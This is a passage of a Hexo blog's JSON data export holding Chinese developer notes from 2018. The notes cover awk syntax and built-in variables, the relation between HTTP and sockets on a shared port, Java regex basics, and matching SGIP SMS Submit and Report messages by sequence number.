class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$n\t当前记录的第n个字段，字段间由FS分隔</span><br><span class=\"line\">$0\t完整的输入记录</span><br><span class=\"line\">ARGC\t命令行参数的数目</span><br><span class=\"line\">ARGIND\t命令行中当前文件的位置(从0开始算)</span><br><span class=\"line\">ARGV\t包含命令行参数的数组</span><br><span class=\"line\">CONVFMT\t数字转换格式(默认值为%.6g)ENVIRON环境变量关联数组</span><br><span class=\"line\">ERRNO\t最后一个系统错误的描述</span><br><span class=\"line\">FIELDWIDTHS\t字段宽度列表(用空格键分隔)</span><br><span class=\"line\">FILENAME\t当前文件名</span><br><span class=\"line\">FNR\t各文件分别计数的行号</span><br><span class=\"line\">FS\t字段分隔符(默认是任何空格)</span><br><span class=\"line\">IGNORECASE\t如果为真，则进行忽略大小写的匹配</span><br><span class=\"line\">NF\t一条记录的字段的数目</span><br><span class=\"line\">NR\t已经读出的记录数，就是行号，从1开始</span><br><span class=\"line\">OFMT\t数字的输出格式(默认值是%.6g)</span><br><span class=\"line\">OFS\t输出记录分隔符（输出换行符），输出时用指定的符号代替换行符</span><br><span class=\"line\">ORS\t输出记录分隔符(默认值是一个换行符)</span><br><span class=\"line\">RLENGTH\t由match函数所匹配的字符串的长度</span><br><span class=\"line\">RS\t记录分隔符(默认是一个换行符)</span><br><span class=\"line\">RSTART\t由match函数所匹配的字符串的第一个位置</span><br><span class=\"line\">SUBSEP\t数组下标分隔符(默认值是/034)</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-awk\"><a href=\"#1-awk\" class=\"headerlink\" title=\"1.awk\"></a>1.awk</h4><p>用于处理文本</p>\n<h4 id=\"2-用法\"><a href=\"#2-用法\" class=\"headerlink\" title=\"2.用法\"></a>2.用法</h4><p>参考<a href=\"http://www.runoob.com/linux/linux-comm-awk.html\" target=\"_blank\" rel=\"noopener\">菜鸟教程</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk [选项参数] &apos;script&apos; var=value file(s)</span><br><span class=\"line\">或</span><br><span class=\"line\">awk [选项参数] -f scriptfile var=value file(s)</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"1-选项参数\"><a href=\"#1-选项参数\" class=\"headerlink\" title=\"1.选项参数\"></a>1.选项参数</h6><ul>\n<li>-F fs or –field-separator fs<br><br>指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式，如-F,。<br></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk -F, &apos;&#123;print $1,$2&#125;&apos; xxx.txt</span><br><span class=\"line\">以逗号为分隔符，打印第一第二列</span><br></pre></td></tr></table></figure>\n<ul>\n<li>-v var=value or –asign var=value<br>赋值一个用户定义变量。</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk -va=1 &apos;&#123;print $1,$1+a&#125;&apos; xxx.txt</span><br><span class=\"line\">设置a为变量，打印第一和a+1列</span><br></pre></td></tr></table></figure>\n<h6 id=\"2-运算符\"><a href=\"#2-运算符\" class=\"headerlink\" title=\"2.运算符\"></a>2.运算符</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">= += -= *= /= %= ^= **=\t赋值</span><br><span class=\"line\">?:\tC条件表达式</span><br><span class=\"line\">||\t逻辑或</span><br><span class=\"line\">&amp;&amp;\t逻辑与</span><br><span class=\"line\">~ ~!\t匹配正则表达式和不匹配正则表达式</span><br><span class=\"line\">&lt; &lt;= &gt; &gt;= != ==\t关系运算符</span><br><span class=\"line\">空格\t连接</span><br><span class=\"line\">+ -\t加，减</span><br><span class=\"line\">* / %\t乘，除与求余</span><br><span class=\"line\">+ - !\t一元加，减和逻辑非</span><br><span class=\"line\">^ ***\t求幂</span><br><span class=\"line\">++ --\t增加或减少，作为前缀或后缀</span><br><span class=\"line\">$\t字段引用</span><br><span class=\"line\">in\t数组成员</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk &apos;$1&gt;2&apos; xxx.txt</span><br><span class=\"line\">输出第一列大于2的行</span><br><span class=\"line\">awk -F, &apos;$1&gt;2&apos; xxx.txt</span><br><span class=\"line\">输出第一列大于2的行(字符串也会进行比较 例:value1-2 &gt; 2)</span><br><span class=\"line\">value1-1 + value1-2 = 0?</span><br><span class=\"line\">awk -F, &apos;$1=2&apos; xxx.txt</span><br><span class=\"line\">将第一列赋值为2</span><br><span class=\"line\">awk &apos;$1&gt;2 &amp;&amp; $2==&quot;Are&quot; &#123;print $1,$2,$3&#125;&apos; xxx.txt</span><br><span class=\"line\">第一列大于2并且第二列等于&apos;Are&apos;的行,输出第一二三列</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-内建变量\"><a href=\"#3-内建变量\" class=\"headerlink\" title=\"3.内建变量\"></a>3.内建变量</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$n\t当前记录的第n个字段，字段间由FS分隔</span><br><span class=\"line\">$0\t完整的输入记录</span><br><span class=\"line\">ARGC\t命令行参数的数目</span><br><span class=\"line\">ARGIND\t命令行中当前文件的位置(从0开始算)</span><br><span class=\"line\">ARGV\t包含命令行参数的数组</span><br><span class=\"line\">CONVFMT\t数字转换格式(默认值为%.6g)ENVIRON环境变量关联数组</span><br><span class=\"line\">ERRNO\t最后一个系统错误的描述</span><br><span class=\"line\">FIELDWIDTHS\t字段宽度列表(用空格键分隔)</span><br><span class=\"line\">FILENAME\t当前文件名</span><br><span class=\"line\">FNR\t各文件分别计数的行号</span><br><span class=\"line\">FS\t字段分隔符(默认是任何空格)</span><br><span class=\"line\">IGNORECASE\t如果为真，则进行忽略大小写的匹配</span><br><span class=\"line\">NF\t一条记录的字段的数目</span><br><span class=\"line\">NR\t已经读出的记录数，就是行号，从1开始</span><br><span class=\"line\">OFMT\t数字的输出格式(默认值是%.6g)</span><br><span class=\"line\">OFS\t输出记录分隔符（输出换行符），输出时用指定的符号代替换行符</span><br><span class=\"line\">ORS\t输出记录分隔符(默认值是一个换行符)</span><br><span class=\"line\">RLENGTH\t由match函数所匹配的字符串的长度</span><br><span class=\"line\">RS\t记录分隔符(默认是一个换行符)</span><br><span class=\"line\">RSTART\t由match函数所匹配的字符串的第一个位置</span><br><span class=\"line\">SUBSEP\t数组下标分隔符(默认值是/034)</span><br></pre></td></tr></table></figure>\n"},{"title":"Http与Socket","date":"2018-12-24T02:11:07.000Z","_content":"#### 1.问题\n今天发现网关程序中，java监听了8083端口(Http)，同时，又在程序中使用了8083端口作为服务端，接收来自短信网关给我们发送的回执（Sgip1.2)。<br>\n不知道两者之间是否有冲突.了解了http与socket区别后，就知道了。\n\n#### 2.OSI七层模型\n![OSI](../images/osi_七层模型.jpg)\n图片来自:https://www.jianshu.com/p/a18a5ba78fad\n\n#### 3.Http与Socket所在层\n\nHttp：Http是应用层的一种协议，用来对Http协议的数据进行读取。<br>\n\nTcp/Udp: 传输层。<br>\n\nIp: 网络层.<br>\n\nSocket: Socket是对 TCP/IP 协议的封装，Socket 只是个接口不是协议，通过 Socket 我们才能使用 TCP/IP 协议，除了 TCP，也可以使用 UDP 协议来传递数据。<br>\n\nPort: 端口是Tcp/Udp建立连接所用，也是在传输层，表现为Socket监听Port。<br>\n\n#### 4.数据的处理流程\n- 1.ClientA向服务端发一个数据，先根据所在层次，层层向下，按照所在层次的协议对数据进行包装。\n- 2.数据到达服务端后，从底层(物理层)开始，将数据按照对应层协议，进行处理，然后传到上一层，直到得到可用数据。\n- 3.http协议的数据，从客户端应用层，到达服务端应用层，一次传输完成。\n- 4.Sgip的数据，在ClientA时，先将数据按照Sgip协议进行包装，在传输层通过Socket发送(依然往下包装到达物理层，Sgip数据包),服务端接收到时，层层解包装，在传输层，Socket接收到数据包后，此时包装层已经只剩下了Sgip包装，因此，在这里按照Sgip协议解包装后，就已经得到了想要的数据。不需要再往上层传递.\n- 5.因此，在这里，虽然Http与Sgip都使用的统一端口，但是互不影响。\n\n#### 5.总结\n- 1.Http是应用层协议，Socket是对Tcp/Ip的封装\n- 2.Http发送数据也会经过Socket(Tcp或者Udp建立的连接)\n- 3.数据的传输和接收，是通过Socket,但是得到数据，是按照其包装和解包装的协议来的，Socket只是单纯的传输数据(bit)，并不关心数据是什么，有什么意义。\n- 4.Socket传输时，发送字符串，接收时也能直接接收到字符串，是因为包装/解包装层级一样，得到了发送时的数据。\n","source":"_posts/http与socket.md","raw":"---\ntitle: Http与Socket\ndate: 2018-12-24 10:11:07\ntags: [socket]\n---\n#### 1.问题\n今天发现网关程序中，java监听了8083端口(Http)，同时，又在程序中使用了8083端口作为服务端，接收来自短信网关给我们发送的回执（Sgip1.2)。<br>\n不知道两者之间是否有冲突.了解了http与socket区别后，就知道了。\n\n#### 2.OSI七层模型\n![OSI](../images/osi_七层模型.jpg)\n图片来自:https://www.jianshu.com/p/a18a5ba78fad\n\n#### 3.Http与Socket所在层\n\nHttp：Http是应用层的一种协议，用来对Http协议的数据进行读取。<br>\n\nTcp/Udp: 传输层。<br>\n\nIp: 网络层.<br>\n\nSocket: Socket是对 TCP/IP 协议的封装，Socket 只是个接口不是协议，通过 Socket 我们才能使用 TCP/IP 协议，除了 TCP，也可以使用 UDP 协议来传递数据。<br>\n\nPort: 端口是Tcp/Udp建立连接所用，也是在传输层，表现为Socket监听Port。<br>\n\n#### 4.数据的处理流程\n- 1.ClientA向服务端发一个数据，先根据所在层次，层层向下，按照所在层次的协议对数据进行包装。\n- 2.数据到达服务端后，从底层(物理层)开始，将数据按照对应层协议，进行处理，然后传到上一层，直到得到可用数据。\n- 3.http协议的数据，从客户端应用层，到达服务端应用层，一次传输完成。\n- 4.Sgip的数据，在ClientA时，先将数据按照Sgip协议进行包装，在传输层通过Socket发送(依然往下包装到达物理层，Sgip数据包),服务端接收到时，层层解包装，在传输层，Socket接收到数据包后，此时包装层已经只剩下了Sgip包装，因此，在这里按照Sgip协议解包装后，就已经得到了想要的数据。不需要再往上层传递.\n- 5.因此，在这里，虽然Http与Sgip都使用的统一端口，但是互不影响。\n\n#### 5.总结\n- 1.Http是应用层协议，Socket是对Tcp/Ip的封装\n- 2.Http发送数据也会经过Socket(Tcp或者Udp建立的连接)\n- 3.数据的传输和接收，是通过Socket,但是得到数据，是按照其包装和解包装的协议来的，Socket只是单纯的传输数据(bit)，并不关心数据是什么，有什么意义。\n- 4.Socket传输时，发送字符串，接收时也能直接接收到字符串，是因为包装/解包装层级一样，得到了发送时的数据。\n","slug":"http与socket","published":1,"updated":"2018-12-24T08:43:09.181Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr6404zb00016cvpn74dey4w","content":"<h4 id=\"1-问题\"><a href=\"#1-问题\" class=\"headerlink\" title=\"1.问题\"></a>1.问题</h4><p>今天发现网关程序中，java监听了8083端口(Http)，同时，又在程序中使用了8083端口作为服务端，接收来自短信网关给我们发送的回执（Sgip1.2)。<br><br>不知道两者之间是否有冲突.了解了http与socket区别后，就知道了。</p>\n<h4 id=\"2-OSI七层模型\"><a href=\"#2-OSI七层模型\" class=\"headerlink\" title=\"2.OSI七层模型\"></a>2.OSI七层模型</h4><p><img src=\"../images/osi_七层模型.jpg\" alt=\"OSI\"><br>图片来自:<a href=\"https://www.jianshu.com/p/a18a5ba78fad\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/a18a5ba78fad</a></p>\n<h4 id=\"3-Http与Socket所在层\"><a href=\"#3-Http与Socket所在层\" class=\"headerlink\" title=\"3.Http与Socket所在层\"></a>3.Http与Socket所在层</h4><p>Http：Http是应用层的一种协议，用来对Http协议的数据进行读取。<br></p>\n<p>Tcp/Udp: 传输层。<br></p>\n<p>Ip: 网络层.<br></p>\n<p>Socket: Socket是对 TCP/IP 协议的封装，Socket 只是个接口不是协议，通过 Socket 我们才能使用 TCP/IP 协议，除了 TCP，也可以使用 UDP 协议来传递数据。<br></p>\n<p>Port: 端口是Tcp/Udp建立连接所用，也是在传输层，表现为Socket监听Port。<br></p>\n<h4 id=\"4-数据的处理流程\"><a href=\"#4-数据的处理流程\" class=\"headerlink\" title=\"4.数据的处理流程\"></a>4.数据的处理流程</h4><ul>\n<li>1.ClientA向服务端发一个数据，先根据所在层次，层层向下，按照所在层次的协议对数据进行包装。</li>\n<li>2.数据到达服务端后，从底层(物理层)开始，将数据按照对应层协议，进行处理，然后传到上一层，直到得到可用数据。</li>\n<li>3.http协议的数据，从客户端应用层，到达服务端应用层，一次传输完成。</li>\n<li>4.Sgip的数据，在ClientA时，先将数据按照Sgip协议进行包装，在传输层通过Socket发送(依然往下包装到达物理层，Sgip数据包),服务端接收到时，层层解包装，在传输层，Socket接收到数据包后，此时包装层已经只剩下了Sgip包装，因此，在这里按照Sgip协议解包装后，就已经得到了想要的数据。不需要再往上层传递.</li>\n<li>5.因此，在这里，虽然Http与Sgip都使用的统一端口，但是互不影响。</li>\n</ul>\n<h4 id=\"5-总结\"><a href=\"#5-总结\" class=\"headerlink\" title=\"5.总结\"></a>5.总结</h4><ul>\n<li>1.Http是应用层协议，Socket是对Tcp/Ip的封装</li>\n<li>2.Http发送数据也会经过Socket(Tcp或者Udp建立的连接)</li>\n<li>3.数据的传输和接收，是通过Socket,但是得到数据，是按照其包装和解包装的协议来的，Socket只是单纯的传输数据(bit)，并不关心数据是什么，有什么意义。</li>\n<li>4.Socket传输时，发送字符串，接收时也能直接接收到字符串，是因为包装/解包装层级一样，得到了发送时的数据。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-问题\"><a href=\"#1-问题\" class=\"headerlink\" title=\"1.问题\"></a>1.问题</h4><p>今天发现网关程序中，java监听了8083端口(Http)，同时，又在程序中使用了8083端口作为服务端，接收来自短信网关给我们发送的回执（Sgip1.2)。<br><br>不知道两者之间是否有冲突.了解了http与socket区别后，就知道了。</p>\n<h4 id=\"2-OSI七层模型\"><a href=\"#2-OSI七层模型\" class=\"headerlink\" title=\"2.OSI七层模型\"></a>2.OSI七层模型</h4><p><img src=\"../images/osi_七层模型.jpg\" alt=\"OSI\"><br>图片来自:<a href=\"https://www.jianshu.com/p/a18a5ba78fad\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/a18a5ba78fad</a></p>\n<h4 id=\"3-Http与Socket所在层\"><a href=\"#3-Http与Socket所在层\" class=\"headerlink\" title=\"3.Http与Socket所在层\"></a>3.Http与Socket所在层</h4><p>Http：Http是应用层的一种协议，用来对Http协议的数据进行读取。<br></p>\n<p>Tcp/Udp: 传输层。<br></p>\n<p>Ip: 网络层.<br></p>\n<p>Socket: Socket是对 TCP/IP 协议的封装，Socket 只是个接口不是协议，通过 Socket 我们才能使用 TCP/IP 协议，除了 TCP，也可以使用 UDP 协议来传递数据。<br></p>\n<p>Port: 端口是Tcp/Udp建立连接所用，也是在传输层，表现为Socket监听Port。<br></p>\n<h4 id=\"4-数据的处理流程\"><a href=\"#4-数据的处理流程\" class=\"headerlink\" title=\"4.数据的处理流程\"></a>4.数据的处理流程</h4><ul>\n<li>1.ClientA向服务端发一个数据，先根据所在层次，层层向下，按照所在层次的协议对数据进行包装。</li>\n<li>2.数据到达服务端后，从底层(物理层)开始，将数据按照对应层协议，进行处理，然后传到上一层，直到得到可用数据。</li>\n<li>3.http协议的数据，从客户端应用层，到达服务端应用层，一次传输完成。</li>\n<li>4.Sgip的数据，在ClientA时，先将数据按照Sgip协议进行包装，在传输层通过Socket发送(依然往下包装到达物理层，Sgip数据包),服务端接收到时，层层解包装，在传输层，Socket接收到数据包后，此时包装层已经只剩下了Sgip包装，因此，在这里按照Sgip协议解包装后，就已经得到了想要的数据。不需要再往上层传递.</li>\n<li>5.因此，在这里，虽然Http与Sgip都使用的统一端口，但是互不影响。</li>\n</ul>\n<h4 id=\"5-总结\"><a href=\"#5-总结\" class=\"headerlink\" title=\"5.总结\"></a>5.总结</h4><ul>\n<li>1.Http是应用层协议，Socket是对Tcp/Ip的封装</li>\n<li>2.Http发送数据也会经过Socket(Tcp或者Udp建立的连接)</li>\n<li>3.数据的传输和接收，是通过Socket,但是得到数据，是按照其包装和解包装的协议来的，Socket只是单纯的传输数据(bit)，并不关心数据是什么，有什么意义。</li>\n<li>4.Socket传输时，发送字符串，接收时也能直接接收到字符串，是因为包装/解包装层级一样，得到了发送时的数据。</li>\n</ul>\n"},{"title":"mavenmultiplemodules","date":"2018-11-28T03:55:54.000Z","_content":"","source":"_posts/mavenmultiplemodules.md","raw":"---\ntitle: mavenmultiplemodules\ndate: 2018-11-28 11:55:54\ntags:\n---\n","slug":"mavenmultiplemodules","published":1,"updated":"2018-11-28T03:55:54.251Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr6404zg00036cvpevhtx1h6","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"正则","date":"2018-10-10T03:28:40.000Z","_content":"\n#### 1.正则表达式\n正则表达式一般用来匹配字符串，进行相应处理。\n\n#### 2.常用符号\n- (exp)  子串\n- {n} {n,} {n,m} 限定匹配次数。分别为:匹配n次;至少n次;至少n次，至多m次。\n- \\* + ? 限定次数。分别为:0或多次;1或多次;0或1次\n- | 或 &nbsp;&nbsp;[a|b]匹配a或b\n- ^ java中为非，一般为匹配开始位置\n- $ 匹配结尾位置\n- \\\\b 匹配边界，即字与空格间的位置\n- 数字 [0-9]或\\\\d &nbsp;&nbsp;非数字 [^0-9]或\\\\D\n- 字母 [a-z] &nbsp;&nbsp;非字母 [^a-z]\n- 任何字符 [A-Za-z0-9]或\\\\w  &nbsp;&nbsp;非字符 [^A-Za-z0-9]或\\\\W\n\n#### 3.例子\n1. 例一\n\n    匹配两个或三个十一位的电话号码，中间用逗号分割(java)\n    ```\n    String zz1 = \"(\\\\d{11},){1,3}\\\\d{11}\";\n    String str1 = \"17888824094,17888824094,17888824094\";\n    boolean isTrue1 = Pattern.matches(zz1, str1);\n    ```\n","source":"_posts/正则.md","raw":"---\ntitle: 正则\ndate: 2018-10-10 11:28:40\ntags: [正则]\n---\n\n#### 1.正则表达式\n正则表达式一般用来匹配字符串，进行相应处理。\n\n#### 2.常用符号\n- (exp)  子串\n- {n} {n,} {n,m} 限定匹配次数。分别为:匹配n次;至少n次;至少n次，至多m次。\n- \\* + ? 限定次数。分别为:0或多次;1或多次;0或1次\n- | 或 &nbsp;&nbsp;[a|b]匹配a或b\n- ^ java中为非，一般为匹配开始位置\n- $ 匹配结尾位置\n- \\\\b 匹配边界，即字与空格间的位置\n- 数字 [0-9]或\\\\d &nbsp;&nbsp;非数字 [^0-9]或\\\\D\n- 字母 [a-z] &nbsp;&nbsp;非字母 [^a-z]\n- 任何字符 [A-Za-z0-9]或\\\\w  &nbsp;&nbsp;非字符 [^A-Za-z0-9]或\\\\W\n\n#### 3.例子\n1. 例一\n\n    匹配两个或三个十一位的电话号码，中间用逗号分割(java)\n    ```\n    String zz1 = \"(\\\\d{11},){1,3}\\\\d{11}\";\n    String str1 = \"17888824094,17888824094,17888824094\";\n    boolean isTrue1 = Pattern.matches(zz1, str1);\n    ```\n","slug":"正则","published":1,"updated":"2018-10-11T07:31:26.733Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr6404zi00046cvpht1la5ju","content":"<h4 id=\"1-正则表达式\"><a href=\"#1-正则表达式\" class=\"headerlink\" title=\"1.正则表达式\"></a>1.正则表达式</h4><p>正则表达式一般用来匹配字符串，进行相应处理。</p>\n<h4 id=\"2-常用符号\"><a href=\"#2-常用符号\" class=\"headerlink\" title=\"2.常用符号\"></a>2.常用符号</h4><ul>\n<li>(exp)  子串</li>\n<li>{n} {n,} {n,m} 限定匹配次数。分别为:匹配n次;至少n次;至少n次，至多m次。</li>\n<li>* + ? 限定次数。分别为:0或多次;1或多次;0或1次</li>\n<li>| 或 &nbsp;&nbsp;[a|b]匹配a或b</li>\n<li>^ java中为非，一般为匹配开始位置</li>\n<li>$ 匹配结尾位置</li>\n<li>\\b 匹配边界，即字与空格间的位置</li>\n<li>数字 [0-9]或\\d &nbsp;&nbsp;非数字 [^0-9]或\\D</li>\n<li>字母 [a-z] &nbsp;&nbsp;非字母 [^a-z]</li>\n<li>任何字符 [A-Za-z0-9]或\\w  &nbsp;&nbsp;非字符 [^A-Za-z0-9]或\\W</li>\n</ul>\n<h4 id=\"3-例子\"><a href=\"#3-例子\" class=\"headerlink\" title=\"3.例子\"></a>3.例子</h4><ol>\n<li><p>例一</p>\n<p> 匹配两个或三个十一位的电话号码，中间用逗号分割(java)</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String zz1 = &quot;(\\\\d&#123;11&#125;,)&#123;1,3&#125;\\\\d&#123;11&#125;&quot;;</span><br><span class=\"line\">String str1 = &quot;17888824094,17888824094,17888824094&quot;;</span><br><span class=\"line\">boolean isTrue1 = Pattern.matches(zz1, str1);</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-正则表达式\"><a href=\"#1-正则表达式\" class=\"headerlink\" title=\"1.正则表达式\"></a>1.正则表达式</h4><p>正则表达式一般用来匹配字符串，进行相应处理。</p>\n<h4 id=\"2-常用符号\"><a href=\"#2-常用符号\" class=\"headerlink\" title=\"2.常用符号\"></a>2.常用符号</h4><ul>\n<li>(exp)  子串</li>\n<li>{n} {n,} {n,m} 限定匹配次数。分别为:匹配n次;至少n次;至少n次，至多m次。</li>\n<li>* + ? 限定次数。分别为:0或多次;1或多次;0或1次</li>\n<li>| 或 &nbsp;&nbsp;[a|b]匹配a或b</li>\n<li>^ java中为非，一般为匹配开始位置</li>\n<li>$ 匹配结尾位置</li>\n<li>\\b 匹配边界，即字与空格间的位置</li>\n<li>数字 [0-9]或\\d &nbsp;&nbsp;非数字 [^0-9]或\\D</li>\n<li>字母 [a-z] &nbsp;&nbsp;非字母 [^a-z]</li>\n<li>任何字符 [A-Za-z0-9]或\\w  &nbsp;&nbsp;非字符 [^A-Za-z0-9]或\\W</li>\n</ul>\n<h4 id=\"3-例子\"><a href=\"#3-例子\" class=\"headerlink\" title=\"3.例子\"></a>3.例子</h4><ol>\n<li><p>例一</p>\n<p> 匹配两个或三个十一位的电话号码，中间用逗号分割(java)</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String zz1 = &quot;(\\\\d&#123;11&#125;,)&#123;1,3&#125;\\\\d&#123;11&#125;&quot;;</span><br><span class=\"line\">String str1 = &quot;17888824094,17888824094,17888824094&quot;;</span><br><span class=\"line\">boolean isTrue1 = Pattern.matches(zz1, str1);</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n"},{"title":"sgip","date":"2018-09-04T08:49:30.000Z","_content":"\n###### 问题:\n在联通SGIP网关中，Submit发送消息后，怎么将返回的REPORT与之关联起来。\n\n###### Submit内容\n```\nCommandId*\t命令ID，十六进制数字\nSequenceNumber\t序列号，十六进制数字\nSPNumber\tSP的接入号码，字符\nChargeNumber\t付费号码，字符，手机号码前加“86”国别标志；当且仅当群发且对用户收费时为空；如果为空，则该条短消息产生的费用由UserNumber代表的用户支付；如果为全零字符串“000000000000000000000”，表示该条短消息产生的费用由SP支付。\nUserNumber\t一个或多个接收该短消息的手机号，手机号之间用逗号(,)隔开，字符，手机号码前加“86”国别标志，如8613001125453,8613001132345\nCorpId\t企业代码，取值范围0-99999，字符\nServiceType\t业务代码，由SP定义，字符\nFeeType*\t计费类型，字符\nFeeValue\t取值范围0-99999，该条短消息的收费值，单位为分，由SP定义，字符\n对于包月制收费的用户，该值为月租费的值\nGivenValue\t取值范围0-99999，赠送用户的话费，单位为分，由SP定义，特指由SP向用户发送广告时的赠送话费，字符\nAgentFlag\t代收费标志，0：应收；1：实收，字符\nMorelatetoMTFlag\t引起MT消息的原因\n0-MO点播引起的第一条MT消息；\n1-MO点播引起的非第一条MT消息；\n2-非MO点播引起的MT消息；\n3-系统反馈引起的MT消息。\n字符\nPriority\t优先级0-9从低到高，默认为0，十六进制数字\nExpireTime\t短消息寿命的终止时间，如果为空，表示使用短消息中心的缺省值。时间内容为16个字符，格式为“yymmddhhmmsstnnp”，其中“tnnp”取固定值“032+”，即默认系统为北京时间\nScheduleTime\t短消息定时发送的时间，如果为空，表示立刻发送该短消息。时间内容为16个字符，格式为“yymmddhhmmsstnnp”，其中“tnnp”取固定值“032+”，即默认系统为北京时间\nReportFlag\t状态报告标记\n0-该条消息只有最后出错时要返回状态报告\n1-该条消息无论最后是否成功都要返回状态报告\n2-该条消息不需要返回状态报告\n3-该条消息仅携带包月计费信息，不下发给用户，要返回状态报告\n其它-保留\n缺省设置为0，十六进制数字\nMessageType\t信息类型：\n0-短消息信息\n其它：待定\n\n十六进制数字\nTP_pid\tGSM协议类型。详细解释请参考GSM03.40中的9.2.3.9\n十六进制数字\nTP_udhi\tGSM协议类型。详细解释请参考GSM03.40中的9.2.3.23,仅使用1位，右对齐\n十六进制数字\nMessageCoding\t短消息的编码格式。\n0：纯ASCII字符串\n3：写卡操作\n4：二进制编码\n8：UCS2编码\n15：GBK编码\n其它参见GSM3.38第4节：SMS Data Coding Scheme\n十六进制数字\nMessageContent\t短消息的内容，十六进制数字\nReserve\t保留，扩展用\n```\n###### REPORT内容\n```\nCommandId\t命令ID，十六进制数字\nSequenceNumber\t序列号，十六进制数字\nSubmitSequenceNumber\t该命令所涉及的Submit或deliver命令的序列号，十六进制数字\nReportType\tReport命令类型\n0：对先前一条Submit命令的状态报告\n1：对先前一条前转Deliver命令的状态报告，十六进制数字\nUserNumber\t接收该短消息的手机号，字符，手机号码前加“86”国别标志\nState*\t该命令所涉及的短消息的当前执行状态\n0：发送成功\n1：等待发送\n2：发送失败\n十六进制数字\nErrorCode\t当State=2时为错误码值，否则为0，十六进制数字\nReserve\t保留，扩展用\n```\n###### 观察\n  请求时，返回：\n  ![REPORT1](../images/report1.jpg)\n  后台输出REPORT:\n  ![REPORT2](../images/report2.jpg)\n\n  通过对比发现其中有某两个字段相同，ok,到这基本搞定。\n\n###### 解决\n1.在Submit时，将SequenceNumber存储\n```\n//将seq与spNumber存储 SequenceNumber为 seq1+seq2+seq3\nSubmitReportMapEntity submitReportMapEntity = new SubmitReportMapEntity();\nsubmitReportMapEntity.setSeq1(String.valueOf(submit.getSeqno_1()));\nsubmitReportMapEntity.setSeq2(String.valueOf(submit.getSeqno_2()));\nsubmitReportMapEntity.setSeq3(String.valueOf(submit.getSeqno_3()));\nsubmitReportMapEntity.setSpNumber(String.valueOf(submit.getSPNumber()));\nlogService.storeSubmitReportMap(submitReportMapEntity);\n```\n2.Report时通过SequenceNumber获取SP(外显号)\n```\nString spNumber_temp = new String();\nspNumber_temp = logService.submitReportMapInquiry(String.valueOf(report.getSeq_2()),String.valueOf(report.getSeq_3()));\n```\n","source":"_posts/sgip.md","raw":"---\ntitle: sgip\ndate: 2018-09-04 16:49:30\ntags: [sgip, java]\n---\n\n###### 问题:\n在联通SGIP网关中，Submit发送消息后，怎么将返回的REPORT与之关联起来。\n\n###### 